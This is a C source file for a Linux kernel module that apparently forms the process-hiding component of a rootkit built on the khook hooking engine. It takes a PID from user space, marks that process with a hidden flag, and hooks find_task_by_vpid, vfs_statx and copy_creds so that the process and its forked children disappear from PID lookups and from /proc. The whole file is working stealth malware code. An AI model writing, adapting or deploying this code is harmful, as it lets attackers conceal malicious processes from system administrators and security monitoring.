#include "../khook/engine.h"
#include "../protocol.h"
#include "process_hiding.h"

#include <linux/uaccess.h> // copy_from_user
#include <linux/pid.h> // find_get_pid, put_pid, get_pid_task
#include <linux/sched.h> // find_task_by_vpid
#include <linux/cred.h> // copy_creds, exit_creds
#include <linux/slab.h> // kmalloc, kfree
#include <linux/stat.h> // struct kstat

#define HIDDEN_PROCESS_FLAG 0x02000000

// return 1 if hidden
static int is_task_struct_hidden(struct task_struct *pid_task) {
    return pid_task && (pid_task->flags & HIDDEN_PROCESS_FLAG);
}

// return zero if success
static int hide_process(unsigned int pid) {
    rcu_read_lock();
    struct pid *pid_pointer = find_get_pid(pid);
    if (pid_pointer == NULL) {
        goto err;
    }
    struct task_struct *pid_task = get_pid_task(pid_pointer, PIDTYPE_PID);
    if (pid_task == NULL) {
        goto err;
    }
    pid_task->flags |= HIDDEN_PROCESS_FLAG;
    rcu_read_unlock();
    return 0;

    err:
    if (pid_pointer != NULL) {
        put_pid(pid_pointer);
    }
    rcu_read_unlock();
    return 1;
}

int handle_process_hiding_request(void *raw_subargs) {
    struct ProcessHidingSubargs subargs;
    if (copy_from_user(&subargs, (void *)raw_subargs, sizeof(struct ProcessHidingSubargs)) != 0) {
        // copy failed
        goto err;
    }
    if (hide_process(subargs.pid) != 0) {
        // process hide failed
        goto err;
    }
    return 0;

    err:
    return 1;
}

// Find a task by its virtual pid
//
// By hooking this function, we can hide the process from others to get it by pid
KHOOK(find_task_by_vpid);
static struct task_struct *khook_find_task_by_vpid(pid_t vnr) {
	struct task_struct *tsk = NULL;

	tsk = KHOOK_ORIGIN(find_task_by_vpid, vnr);

	if (tsk && is_task_struct_hidden(tsk)) {
		tsk = NULL;
    }

	return tsk;
}

// return 1 if hidden
static int is_process_in_proc_fs_hidden(const char __user *filename) {
	char *name = kmalloc(PATH_MAX, GFP_KERNEL);
	if (strncpy_from_user(name, filename, PATH_MAX) > 0) {
		if (strncmp(name, "/proc/", 6) == 0) {
            char pid_name[16] = {0};
            int index = 6;
            while (1) {
                if (name[index] == '/' || name[index] == '\0' || index >= (15 + 6) || index >= PATH_MAX) {
                    pid_name[index - 6] = '\0'; // index will never exceed 15 before it equals 15
                    break;
                }
                pid_name[index - 6] = name[index];
                index++;
            }
	        pid_t pid = 0;
            if (kstrtoint(pid_name, 10, &pid) == 0) {
                struct task_struct *task = khook_find_task_by_vpid(pid);
                if (task == NULL) {
	                kfree(name);
                    return 1;
                }
            }
		}
	}
	kfree(name);
	return 0;
}

// By hooking this function, we can hide process from others to get it in /proc fs
KHOOK_EXT(int, vfs_statx, int, const char __user *, int, struct kstat *, u32);
static int khook_vfs_statx(int dfd, const char __user *filename, int flags, struct kstat *stat, u32 request_mask) {
	if (is_process_in_proc_fs_hidden(filename)) {
		return -EINVAL;
    }

	return KHOOK_ORIGIN(vfs_statx, dfd, filename, flags, stat, request_mask);
}

// Copy credentials for the new process created by fork()
//
// This function is called when a process called `fork()`. If parent process is hidden, we will hide
// its child process
KHOOK(copy_creds);
static int khook_copy_creds(struct task_struct *p, unsigned long clone_flags) {
	int ret = 0;

	ret = KHOOK_ORIGIN(copy_creds, p, clone_flags);
	if ((ret == 0) && is_task_struct_hidden(current)) {
		p->flags |= HIDDEN_PROCESS_FLAG;
    }

	return ret;
}

// This is called when clear credentials
KHOOK(exit_creds);
static void khook_exit_creds(struct task_struct *p) {
	KHOOK_ORIGIN(exit_creds, p);
	if (is_task_struct_hidden(p)) {
		p->flags &= ~HIDDEN_PROCESS_FLAG;
    }
}
